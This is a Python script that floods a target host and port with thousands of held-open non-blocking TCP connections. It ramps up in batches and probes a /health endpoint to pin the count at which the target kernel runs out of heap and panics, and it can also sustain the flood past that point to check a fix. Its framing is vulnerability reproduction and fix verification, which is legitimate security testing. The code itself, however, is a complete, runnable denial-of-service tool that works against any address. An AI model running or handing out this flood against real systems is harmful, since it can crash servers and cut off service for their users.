#!/usr/bin/env python3
# Connection-flood REPRODUCER — pin the held-connection count at which the target
# kernel exhausts its shared heap and panics. Uses NON-BLOCKING connect_ex so it
# opens thousands of connections fast and never blocks on a saturated accept
# queue (the flaw in the first fd_exhaust.py: blocking connect() + 2s timeout was
# pathologically slow and choked the attacker host). Ramps in batches; after each
# batch it probes /health with a separate short-lived socket. The batch where
# health flips ok->FAIL brackets the panic threshold; the target's serial console
# shows the KERNEL PANIC that confirms it's heap exhaustion.
# Args: <target> <port> <max> <batch> [mode=pin|sustain]
#   pin     (default) — stop at the first sustained health=FAIL and report the
#                       threshold window. Used to PIN the panic point on the
#                       UNFIXED kernel.
#   sustain          — ramp all the way to <max> and hold regardless of health
#                       (still recording each probe), then close. Used to dose the
#                       FIXED kernel well PAST the old panic point: a health=FAIL
#                       here is cap saturation (expected), not a panic — the
#                       serial console is the panic authority.
import socket, time, sys

target, port, mx, batch = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
mode = sys.argv[5] if len(sys.argv) > 5 else "pin"

def health():
    # Read the FULL response (Connection: close => server closes after the body),
    # not a fixed 64 bytes — "L2_OK" is the body, which sits AFTER the status line
    # and headers, well past byte 64.
    try:
        s = socket.socket(); s.settimeout(3); s.connect((target, port))
        s.sendall(b"GET /health HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n")
        buf = b""
        while len(buf) < 4096:
            chunk = s.recv(1024)
            if not chunk:
                break
            buf += chunk
        s.close()
        return b"L2_OK" in buf
    except Exception:
        return False

held = []
last_ok = 0
print("FLOOD_START max=%d batch=%d baseline_health=%s" % (mx, batch, health()), flush=True)
while len(held) < mx:
    for _ in range(batch):
        try:
            s = socket.socket(); s.setblocking(False)
            s.connect_ex((target, port))   # EINPROGRESS expected; socket is held open
            held.append(s)
        except Exception:
            pass
    time.sleep(0.6)                         # let the server allocate per-connection state
    ok = health()
    print("FLOOD_PROGRESS held=%d health=%s" % (len(held), "ok" if ok else "FAIL"), flush=True)
    if ok:
        last_ok = len(held)
    elif mode == "pin":
        time.sleep(2)                       # rule out a transient blip with two re-probes
        if not health() and not health():
            print("FLOOD_THRESHOLD last_ok=%d died_between=%d..%d" % (last_ok, last_ok, len(held)), flush=True)
            break
    # sustain mode: record the FAIL (already printed) but keep ramping to max
print("FLOOD_END held=%d last_ok=%d mode=%s" % (len(held), last_ok, mode), flush=True)
# Hold at peak so a sustained flood sits ON the target while the console is read;
# longer in sustain mode (proving no panic under sustained past-threshold load).
time.sleep(20 if mode == "sustain" else 5)
for s in held:
    try: s.close()
    except Exception: pass
print("FLOOD_CLOSED", flush=True)
